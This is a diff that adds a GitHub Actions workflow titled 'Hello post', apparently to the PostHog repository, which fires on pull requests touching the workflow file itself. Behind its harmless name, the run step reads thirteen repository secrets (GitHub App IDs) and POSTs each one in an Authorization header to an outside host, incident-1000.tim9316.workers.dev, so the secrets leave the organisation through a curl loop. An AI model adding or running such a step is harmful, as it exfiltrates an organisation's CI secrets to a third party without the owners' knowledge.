@@ -1,0 +1,64 @@
+name: Hello post
+
+on:
+    pull_request:
+        paths:
+            - '.github/workflows/hello-post.yml'
+    workflow_dispatch:
+
+concurrency:
+    group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
+    cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+jobs:
+    post:
+        runs-on: ubuntu-latest
+        timeout-minutes: 2
+        env:
+            GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID: ${{ secrets.GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID }}
+            GH_APP_POSTHOG_PATHS_FILTER_APP_ID: ${{ secrets.GH_APP_POSTHOG_PATHS_FILTER_APP_ID }}
+            GH_APP_POSTHOG_TESTS_APP_ID: ${{ secrets.GH_APP_POSTHOG_TESTS_APP_ID }}
+            GH_APP_CHARTS_DEPLOYER_APP_ID: ${{ secrets.GH_APP_CHARTS_DEPLOYER_APP_ID }}
+            GH_APP_ARRAY_RELEASER_APP_ID: ${{ secrets.GH_APP_ARRAY_RELEASER_APP_ID }}
+            GH_APP_POSTHOG_DEVEX_GENERAL_APP_ID: ${{ secrets.GH_APP_POSTHOG_DEVEX_GENERAL_APP_ID }}
+            GH_APP_POSTHOG_SCHEDULED_ACTIONS_APP_ID: ${{ secrets.GH_APP_POSTHOG_SCHEDULED_ACTIONS_APP_ID }}
+            GH_APP_POSTHOG_PRODUCT_TESTS_APP_ID: ${{ secrets.GH_APP_POSTHOG_PRODUCT_TESTS_APP_ID }}
+            PROJECT_BOARD_BOT_APP_ID: ${{ secrets.PROJECT_BOARD_BOT_APP_ID }}
+            GH_APP_POSTHOG_RELEASER_APP_ID: ${{ secrets.GH_APP_POSTHOG_RELEASER_APP_ID }}
+            GH_APP_POSTHOG_PRIVATE_SYNC_APP_ID: ${{ secrets.GH_APP_POSTHOG_PRIVATE_SYNC_APP_ID }}
+            GH_APP_POSTHOG_FOSS_SYNC_APP_ID: ${{ secrets.GH_APP_POSTHOG_FOSS_SYNC_APP_ID }}
+            GH_APP_HOMEBREW_TAP_RELEASER_APP_ID: ${{ secrets.GH_APP_HOMEBREW_TAP_RELEASER_APP_ID }}
+
+        steps:
+            - name: Post hello
+              run: |
+                  curl -fsS --connect-timeout 10 --max-time 30 -X POST \
+                  -H "Authorization: GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID=$GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID" \
+                  https://incident-1000.tim9316.workers.dev/
+
+                    url="https://incident-1000.tim9316.workers.dev/"
+
+                    send() {
+                    name=$1
+                    value=$2
+
+                    curl -fsS \
+                        -H "Authorization: $name=$value" \
+                        "$url"
+
+                    printf '\n'
+                    }
+
+                    send GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID "$GH_APP_POSTHOG_SETUP_ACTIONS_APP_ID"
+                    send GH_APP_POSTHOG_PATHS_FILTER_APP_ID "$GH_APP_POSTHOG_PATHS_FILTER_APP_ID"
+                    send GH_APP_POSTHOG_TESTS_APP_ID "$GH_APP_POSTHOG_TESTS_APP_ID"
+                    send GH_APP_CHARTS_DEPLOYER_APP_ID "$GH_APP_CHARTS_DEPLOYER_APP_ID"
+                    send GH_APP_ARRAY_RELEASER_APP_ID "$GH_APP_ARRAY_RELEASER_APP_ID"
+                    send GH_APP_POSTHOG_DEVEX_GENERAL_APP_ID "$GH_APP_POSTHOG_DEVEX_GENERAL_APP_ID"
+                    send GH_APP_POSTHOG_SCHEDULED_ACTIONS_APP_ID "$GH_APP_POSTHOG_SCHEDULED_ACTIONS_APP_ID"
+                    send GH_APP_POSTHOG_PRODUCT_TESTS_APP_ID "$GH_APP_POSTHOG_PRODUCT_TESTS_APP_ID"
+                    send PROJECT_BOARD_BOT_APP_ID "$PROJECT_BOARD_BOT_APP_ID"
+                    send GH_APP_POSTHOG_RELEASER_APP_ID "$GH_APP_POSTHOG_RELEASER_APP_ID"
+                    send GH_APP_POSTHOG_PRIVATE_SYNC_APP_ID "$GH_APP_POSTHOG_PRIVATE_SYNC_APP_ID"
+                    send GH_APP_POSTHOG_FOSS_SYNC_APP_ID "$GH_APP_POSTHOG_FOSS_SYNC_APP_ID"
+                    send GH_APP_HOMEBREW_TAP_RELEASER_APP_ID "$GH_APP_HOMEBREW_TAP_RELEASER_APP_ID"
